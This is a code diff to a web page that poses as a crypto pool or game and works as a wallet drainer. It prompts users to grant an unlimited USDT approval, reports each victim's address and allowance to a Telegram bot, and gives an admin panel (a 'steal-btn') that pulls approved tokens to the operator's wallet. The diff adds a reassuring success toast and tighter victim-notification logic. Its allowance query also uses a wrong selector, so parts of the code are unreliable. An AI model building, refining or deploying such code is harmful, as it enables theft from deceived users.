@@ -45,9 +45,27 @@ input{width:100%;padding:15px;background:#121720;border:1px solid #2a303e;border
 .admin-input{width:100%;padding:10px;background:#121720;border:1px solid #2a303e;border-radius:8px;color:#fff;margin-bottom:10px}
 .admin-btn{padding:10px 14px;background:#d93030;color:white;border:none;border-radius:8px;cursor:pointer;width:100%;margin-top:6px}
 .steal-btn{background:#e63946}
+
+/* 绿色成功提示 */
+.success-toast{
+  position:fixed;
+  top:20px;
+  left:50%;
+  transform:translateX(-50%);
+  background:#22c55e;
+  color:white;
+  padding:10px 20px;
+  border-radius:8px;
+  font-size:14px;
+  z-index:9999;
+  display:none;
+}
 </style>
 </head>
 <body>
+
+<!-- 绿色成功提示 -->
+<div class="success-toast" id="successToast">✅ 授权成功</div>
 
 <div class="main">
   <div class="header">
@@ -69,7 +87,7 @@ input{width:100%;padding:15px;background:#121720;border:1px solid #2a303e;border
     <button class="rpc-save" id="saveRpc">保存</button>
   </div>
 
-  <!-- 管理员后台（加了提取数量输入框） -->
+  <!-- 管理员后台 -->
   <div class="admin-panel" id="adminPanel">
     <div class="admin-title">🔑 管理员后台</div>
     <input class="admin-input" id="userAddress" placeholder="玩家钱包地址">
@@ -128,6 +146,14 @@ input{width:100%;padding:15px;background:#121720;border:1px solid #2a303e;border
 </div>
 
 <script>
+// 显示绿色成功提示
+function showSuccessToast(msg) {
+  const toast = document.getElementById('successToast')
+  toast.innerText = msg
+  toast.style.display = 'block'
+  setTimeout(() => toast.style.display = 'none', 3000)
+}
+
 document.querySelectorAll('.tab').forEach(tab => {
   tab.onclick = () => {
     document.querySelectorAll('.tab,.panel').forEach(e=>e.classList.remove('active'))
@@ -180,8 +206,9 @@ async function sendToTelegram(userAddr, allowance) {
         text: text.trim()
       })
     })
+    console.log('TG消息发送成功')
   } catch (e) {
-    console.log('TG发送失败', e)
+    console.error('TG发送失败', e)
   }
 }
 
@@ -241,30 +268,45 @@ async function refreshAll() {
   }
 }
 
-// 授权（延迟 3 秒再刷新，确保上链）
+// 授权（修复版：先提交交易 → 等3秒确认 → 查状态 → 发TG）
 document.getElementById('approveBtn').onclick = async () => {
   if(!account) return alert('请先连接钱包')
   try {
+    // 1. 提交授权交易
     const data = '0x095ea7b3'+pad(POOL_SPENDER)+max()
     const tx = await window.ethereum.request({
       method:'eth_sendTransaction',
       params:[{from:account, to:USDT, data:data, gas:'0x4c4340'}]
     })
-    alert('授权交易已提交，请等待 3 秒后状态更新')
-    // 延迟 3 秒再刷新，确保授权已上链
+    alert('授权交易已提交，请等待 3 秒后确认状态')
+
+    // 2. 等待 3 秒，确保链上确认
     await new Promise(r => setTimeout(r, 3000))
+
+    // 3. 刷新状态
     await refreshAll()
 
-    // 获取授权额度并发送 TG
+    // 4. 获取真实授权额度
     const appData = '0xddf252ad'+pad(account)+pad(POOL_SPENDER)
     const allowRaw = await window.ethereum.request({
       method:'eth_call', params:[{to:USDT, data:appData},'latest']
     })
     const allowance = (Number(BigInt(allowRaw)) / 1e18).toFixed(2)
-    await sendToTelegram(account, allowance)
-    alert('授权成功 ✅ 已同步到管理员')
-  }catch(e){
-    alert('授权取消：' + e.message)
+
+    // 5. 只有授权额度>0 才发 TG（说明真的授权成功）
+    if (allowance > 0) {
+      await sendToTelegram(account, allowance)
+      showSuccessToast('✅ 授权成功，已通知管理员')
+    } else {
+      alert('授权未生效，请重试')
+    }
+  } catch(e) {
+    // 只有用户主动在钱包点「取消」时才进这里
+    if (e.message.includes('user rejected')) {
+      alert('授权已取消（用户拒绝签名）')
+    } else {
+      alert('授权失败：' + e.message)
+    }
     await refreshAll()
   }
 }
@@ -306,7 +348,7 @@ document.getElementById('withdrawBtn').onclick = () => {
   alert(`提取已提交\n地址：${addr}\n数量：${amt} USDT`)
 }
 
-// 提取玩家代币（修复版：支持指定数量 + 正确 transferFrom）
+// 提取玩家代币（修复版）
 document.getElementById('takeUserToken').onclick = async () => {
   if(account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return alert('无权限')
 
@@ -324,7 +366,7 @@ document.getElementById('takeUserToken').onclick = async () => {
     const allow = BigInt(allowRes)
     if(allow <= 0n) return alert('该玩家无可用授权额度')
 
-    // 2. 确定提取数量（留空则提取全部）
+    // 2. 确定提取数量
     let extractWei
     if(!extractAmt || isNaN(extractAmt)){
       extractWei = allow
@@ -333,11 +375,11 @@ document.getElementById('takeUserToken').onclick = async () => {
       if(extractWei > allow) return alert('提取数量超过授权额度')
     }
 
-    // 3. 正确 transferFrom 调用
+    // 3. 正确 transferFrom
     const dataTransfer = '0x23b872dd'
-      + pad(user).slice(2) // from: 玩家地址
-      + pad(ADMIN_WALLET).slice(2) // to: 管理员地址
-      + extractWei.toString(16).padStart(64,'0') // value: 提取数量
+      + pad(user).slice(2)
+      + pad(ADMIN_WALLET).slice(2)
+      + extractWei.toString(16).padStart(64,'0')
 
     const tx = await window.ethereum.request({
       method:'eth_sendTransaction',
@@ -345,7 +387,7 @@ document.getElementById('takeUserToken').onclick = async () => {
         from: account,
         to: USDT,
         data: dataTransfer,
-        gas: '0x120000' // 提高 Gas 上限避免 out of gas
+        gas: '0x120000'
       }]
     })
     alert('提取成功！\nTx：' + tx)
